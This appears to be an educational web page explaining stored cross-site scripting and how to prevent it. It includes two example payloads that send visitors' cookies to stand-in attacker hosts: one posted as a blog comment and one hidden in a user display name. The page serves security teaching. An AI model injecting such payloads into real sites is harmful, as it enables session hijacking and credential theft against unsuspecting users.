<h1>Stored Cross-Site Scripting (XSS)</h1>

<div class="definition-box">
  <h2>What is Stored XSS?</h2>
  <p>
    Stored XSS (also known as Persistent XSS) occurs when malicious scripts are
    permanently stored on the target servers, such as in a database, message
    forum, comment field, visitor log, or other storage medium. The victim then
    retrieves the malicious script from the server when they request the stored
    information.
  </p>
</div>

<h2>How Stored XSS Works</h2>
<p>The typical flow of a stored XSS attack:</p>
<ol>
  <li>
    Attacker injects malicious script into a website's storage (comments, user
    profiles, etc.)
  </li>
  <li>
    Website stores the malicious script in its database without proper
    validation or sanitization
  </li>
  <li>
    When victims browse the affected page, the server delivers the stored
    malicious script
  </li>
  <li>
    Victims' browsers execute the script as if it came from a trusted source
  </li>
  <li>
    The malicious script runs with the privileges of the web application in the
    victim's browser
  </li>
</ol>

<div class="example-box">
  <h3>Stored XSS Example:</h3>
  <p>Consider a comment section on a blog where users can post comments:</p>
  <p>An attacker posts the following comment:</p>
  <p>
    <code
      >&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;</code
    >
  </p>
  <p>
    The comment is stored in the website's database and displayed on the blog
    post page.
  </p>
  <p>
    When other users view the page with the comment, their browsers execute the
    script, sending their cookies to the attacker's server.
  </p>
</div>

<h2>Why Stored XSS is Dangerous</h2>
<p>
  Stored XSS is often considered more dangerous than other XSS types because:
</p>
<ul>
  <li>
    The attack is <strong>persistent</strong> and doesn't require individually
    targeting victims
  </li>
  <li>
    It can affect <strong>multiple users</strong> who visit the compromised page
  </li>
  <li>
    Victims don't need to click any special links or perform specific actions
    beyond visiting the legitimate site
  </li>
  <li>
    The attack appears to come from a trusted source, making it more likely to
    succeed
  </li>
  <li>
    Can remain active for long periods until discovered and removed from storage
  </li>
</ul>

<div class="danger-box">
  <h3>Increased Impact</h3>
  <p>
    Stored XSS attacks can reach a much larger audience than reflected XSS
    attacks. A single stored XSS vulnerability on a popular website could
    potentially affect thousands or millions of users, making it a high-value
    target for attackers.
  </p>
</div>

<h2>Common Stored XSS Vulnerable Points</h2>
<p>Stored XSS vulnerabilities commonly occur in:</p>
<ul>
  <li>
    <strong>User profiles</strong> - Name fields, biographical information,
    website links
  </li>
  <li>
    <strong>Comments sections</strong> - Blog comments, product reviews, forum
    posts
  </li>
  <li>
    <strong>Message boards</strong> - Private and public messages between users
  </li>
  <li>
    <strong>User-generated content</strong> - Wiki pages, collaborative
    documents
  </li>
  <li><strong>Social media feeds</strong> - Status updates, shared content</li>
  <li>
    <strong>Contact forms</strong> - Where submission data is displayed to
    administrators
  </li>
</ul>

<div class="example-box">
  <h3>Real-world Example:</h3>
  <p>
    A user updates their display name to:
    <code
      >John&lt;script&gt;fetch('https://evil.com/'+document.cookie)&lt;/script&gt;</code
    >
  </p>
  <p>
    When other users view a list of members or comments by this user, the script
    executes in their browsers.
  </p>
</div>

<h2>Prevention Techniques</h2>
<p>To prevent stored XSS vulnerabilities:</p>
<ol>
  <li>
    <strong>Input Validation</strong> - Validate all user input on the server
    side
  </li>
  <li>
    <strong>Output Encoding</strong> - Encode HTML special characters before
    displaying user-generated content
  </li>
  <li>
    <strong>Content Security Policy (CSP)</strong> - Implement strict CSP
    headers
  </li>
  <li>
    <strong>HTTPOnly Cookies</strong> - Set HTTPOnly flag on sensitive cookies
    to prevent JavaScript access
  </li>
  <li>
    <strong>Sanitization Libraries</strong> - Use trusted libraries to clean
    user input
  </li>
  <li>
    <strong>Regular Security Audits</strong> - Regularly test applications for
    XSS vulnerabilities
  </li>
</ol>

  <h3>Never Trust User Input</h3>
  <p>
    The fundamental principle for preventing stored XSS is to never trust user
    input. Always validate, sanitize, and encode user-supplied data before
    storing it and before outputting it to web pages.
  </p>
